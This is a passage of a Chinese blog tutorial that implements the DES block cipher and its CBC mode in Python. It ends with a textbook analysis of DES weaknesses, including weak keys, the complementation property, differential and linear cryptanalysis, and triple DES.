class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>],</span><br><span class="line">              [<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>],</span><br><span class="line">              [<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>],</span><br><span class="line">              [<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(st),<span class="number">6</span>):<span class="comment">#6位输入，4位输出</span></span><br><span class="line">        begin_s = st[i:i+<span class="number">6</span>]</span><br><span class="line">        row = int(begin_s[<span class="number">0</span>]+begin_s[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        col = int(begin_s[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        num = bin(s_list[j][row*<span class="number">16</span>+col])[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">for</span> padd <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>-len(num)):</span><br><span class="line">            num = <span class="string">"0"</span>+num</span><br><span class="line">        res += num</span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#P盒置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_p</span><span class="params">(st)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    p_list = [<span class="number">16</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">17</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">5</span>,<span class="number">18</span>,<span class="number">31</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">14</span>,<span class="number">32</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">19</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">25</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p_list:</span><br><span class="line">        res +=st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#封装成F函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">funcF</span><span class="params">(st,key)</span>:</span></span><br><span class="line">    str_e_res = box_e(st)</span><br><span class="line">    xor_res = xor(str_e_res,key)</span><br><span class="line">    str_s_res = box_s(xor_res)</span><br><span class="line">    str_p_res = box_p(str_s_res)</span><br><span class="line">    <span class="keyword">return</span> str_p_res</span><br></pre></td></tr></table></figure><h3 id="IP置换与IP逆置换"><a href="#IP置换与IP逆置换" class="headerlink" title="IP置换与IP逆置换"></a>IP置换与IP逆置换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初始IP置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">begin_change</span><span class="params">(st)</span>:</span></span><br><span class="line">    <span class="comment">#置换表</span></span><br><span class="line">    change_list = [<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">    res =<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> change_list:</span><br><span class="line">        res+=st[i<span class="number">-1</span>] <span class="comment">#因为列表是1-64，而数组是0-63，所以减一</span></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#IP逆置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_IP</span><span class="params">(st)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    ip_list = [<span class="number">40</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">24</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">55</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">31</span>,<span class="number">38</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">14</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">62</span>,<span class="number">30</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">21</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">28</span>,<span class="number">35</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">51</span>,<span class="number">19</span>,<span class="number">59</span>,<span class="number">27</span>,<span class="number">34</span>,<span class="number">2</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">50</span>,<span class="number">18</span>,<span class="number">58</span>,<span class="number">26</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">9</span>,<span class="number">49</span>,<span class="number">17</span>,<span class="number">57</span>,<span class="number">25</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">        res += st[i<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="加解密封装"><a href="#加解密封装" class="headerlink" title="加解密封装"></a>加解密封装</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">加密：</span><br><span class="line"><span class="comment">#封装64位加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESenc_test</span><span class="params">(mes,key)</span>:</span></span><br><span class="line">    mes_bin = strtobin(mes)<span class="comment">#明文转二进制</span></span><br><span class="line">    mes_IP = begin_change(mes_bin)<span class="comment">#IP置换</span></span><br><span class="line">    key_bin = strtobin(key)<span class="comment">#密钥转二进制</span></span><br><span class="line">    key_list = key_gen(key_bin)<span class="comment">#生成子密钥</span></span><br><span class="line">    mes_left = mes_IP[<span class="number">0</span>:<span class="number">32</span>]<span class="comment">#明文分两组32位</span></span><br><span class="line">    mes_right = mes_IP[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):<span class="comment">#16轮F函数迭代</span></span><br><span class="line">        mes_tmp = mes_right</span><br><span class="line">        right_f_res = funcF(mes_right,key_list[i])</span><br><span class="line">        mes_right = xor(right_f_res,mes_left)</span><br><span class="line">        mes_left = mes_tmp</span><br><span class="line">    fin_right = mes_right</span><br><span class="line">    fin_left = xor(funcF(mes_right,key_list[<span class="number">15</span>]),mes_left)</span><br><span class="line">    fin = fin_left+fin_right</span><br><span class="line">    fin = mov_IP(fin)<span class="comment">#IP逆置换</span></span><br><span class="line"><span class="keyword">return</span> fin<span class="comment">#返回密文</span></span><br><span class="line">解密：</span><br><span class="line"><span class="comment">#封装64位解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESdec_test</span><span class="params">(cipher,key)</span>:</span>  <span class="comment">#密文直接输64位2进制</span></span><br><span class="line">    <span class="comment">#cipher = strtobin(str)</span></span><br><span class="line">    key_bin = strtobin(key)</span><br><span class="line">    key_list = key_gen(key_bin)</span><br><span class="line">    cipher = begin_change(cipher)</span><br><span class="line">    i = <span class="number">15</span></span><br><span class="line">    cipher_left = cipher[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    cipher_right = cipher[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">        cipher_tmp = cipher_right</span><br><span class="line">        cipher_right = xor(cipher_left,funcF(cipher_right,key_list[i]))</span><br><span class="line">        cipher_left = cipher_tmp</span><br><span class="line">        i = i <span class="number">-1</span></span><br><span class="line">    fin_left = xor(cipher_left,funcF(cipher_right,key_list[<span class="number">0</span>]))</span><br><span class="line">    fin_right = cipher_right</span><br><span class="line">    fin = fin_left+fin_right</span><br><span class="line">    fin = mov_IP(fin)</span><br><span class="line">    my_plain = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(fin),<span class="number">8</span>):</span><br><span class="line">        my_plain += chr(int(fin[j:j+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> my_plain</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="https://s2.ax1x.com/2020/01/12/loL50s.png" alt="loL50s.png"></p><h2 id="CBC工作模式DES加密"><a href="#CBC工作模式DES加密" class="headerlink" title="CBC工作模式DES加密"></a>CBC工作模式DES加密</h2><h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p>对于DES分组加密，每次加密完的结果与下一组的明文进行异或，这就是CBC（密码分组链接模式）。</p><p><img src="https://s2.ax1x.com/2020/01/12/loLxB9.png" alt="loLxB9.png"></p><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><p>这里采用的初始向量是“aaaaaaaa”.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cbc模式下加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_desenc</span><span class="params">(mes,key)</span>:</span></span><br><span class="line">    IV=<span class="string">"aaaaaaaa"</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    cns=<span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> mes[i:i+<span class="number">8</span>]!=<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">            res+=DESenc_test(bintostr(xor(strtobin(IV),strtobin(mes[i:i+<span class="number">8</span>]))),key)</span><br><span class="line">            cns=DESenc_test(bintostr(xor(strtobin(IV),strtobin(mes[i:i+<span class="number">8</span>]))),key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=DESenc_test(bintostr(xor(cns,strtobin(mes[i:i+<span class="number">8</span>]))),key)</span><br><span class="line">            cns=DESenc_test(bintostr(xor(cns,strtobin(mes[i:i+<span class="number">8</span>]))),key)</span><br><span class="line">        i=i+<span class="number">8</span></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#cbc模式下解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_desdec</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    IV=<span class="string">"aaaaaaaa"</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    cns=<span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> cipher[i:i+<span class="number">64</span>]!=<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">            res+=bintostr(xor(strtobin(DESdec_test(cipher[i:i+<span class="number">64</span>],key)),strtobin(IV)))</span><br><span class="line">            cns=cipher[i:i+<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=bintostr(xor(strtobin(DESdec_test(cipher[i:i+<span class="number">64</span>],key)),cns))</span><br><span class="line">            cns=cipher[i:i+<span class="number">64</span>]</span><br><span class="line">        i=i+<span class="number">64</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://s2.ax1x.com/2020/01/12/loOAje.png" alt="loOAje.png"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>安全性争论：</p><ul><li><p>S盒的设计准则还没有完全公开，人们仍然不知道S盒的构造中是否使用了进一步的设计准则</p></li><li><p>DES存在一些弱密钥和半弱密钥</p></li><li><p>DES的56位密钥无法抵抗穷举攻击</p></li><li><p>代数结构存在互补对称性</p></li></ul><p>弱密钥：</p><p>给定初始密钥𝐾生成子密钥时，将种子密钥分成两个部分，如果𝐾使得这两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同，即𝐾1=𝐾2=…=𝐾16，则称密钥𝐾为弱密钥（共有4个）</p><p>若𝐾为弱密钥，则对任意的64比特信息有：<br>$$<br>E_k(E_k(m))=m和D_k(D_k(m))=m<br>$$<br>半弱密钥：</p><p>把明文加密成相同的密文，即存在两个不同的密钥𝑘和𝑘′,使得𝐸<em>𝑘 (𝑚)=𝐸</em>(𝑘^′ ) (𝑚)</p><p>具有下述性质：</p><p>若𝑘和𝑘′为一对弱密钥，𝑚为明文组，则有：<br>$$<br>E_{k’}(E_k(m))=E_k(E_{k’}(m))=m<br>$$<br>互补性：</p><p>对明文𝑚逐位取补，记为𝑚 ̅，密钥𝐾逐位取补，记为𝑘 ̅ ， 若𝑐=𝐸𝑘(𝑚)，则有𝑐 ̅=𝐸_𝑘 ̅ (𝑚 ̅) ，称为算法上的互补性</p><p>由算法中两次异或运算的配置决定：两次异或运算一次在S盒之前，一次在P盒置换之后</p><p>若对DES 的明文和密钥同时取补，则扩展运算E的输出和子密钥产生器的输出也都取补，因而经异或运算后的输出和未取补时的输出一样，即到达S盒的输入数据未变，输出自然也不变，但经第二个异或运算时，由于左边数据已取补，因而输出也就取补</p><p>互补性使DES在选择明文攻击下所需的工作量减半（2^55）</p><p>对选择的明文𝑚和𝑚 ̅ 加密后得到密文如下：<br>$$<br>c_1=E_k(m)\<br>c_2=E_k(m^-)<br>$$<br>由对称互补性可得<br>$$<br>c_2^-=E_{k^-}(m)<br>$$<br>所以对𝑚加密，如果密文为𝑐_1，则加密密钥为𝑘, 如果密文为(𝑐_2 ) ̅，则加密密钥为𝑘 ̅</p><p>差分分析法：</p><p>通过分析特定明文差对结果密文差的影响来获得可能性最大的密钥。这种攻击方法主要适用于攻击迭代分组密码，最初是针对DES提出的一种攻击方法，虽然差分攻击方法对破译16轮的DES不能提供一种实用的方法，但对破译轮数较低的DES是很成功的。</p><p>线性分析法：</p><p>寻找一个给定密码算法的有关明文比特、密文比特和密钥比特的有效线性近似表达式，通过选择充分多的明－密文对来分析密钥的某些比特，用这种方法破译DES比差分分析方法更有效。可用247个已知明文破译8－轮DES。</p><p>三重DES：</p><p><img src="https://s2.ax1x.com/2020/01/12/loXtMD.png" alt="loXtMD.png"></p><p>两密钥的3DES称为加密-解密-加密方案，简记为EDE(encrypt-decrypt-encrypt)</p><p>破译它的穷举密钥搜索量为2<sup>112 </sup>量级，用差分分析破译也要超过10<sup>35</sup>sup&gt;量级。此方案仍有足够的安全性。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span 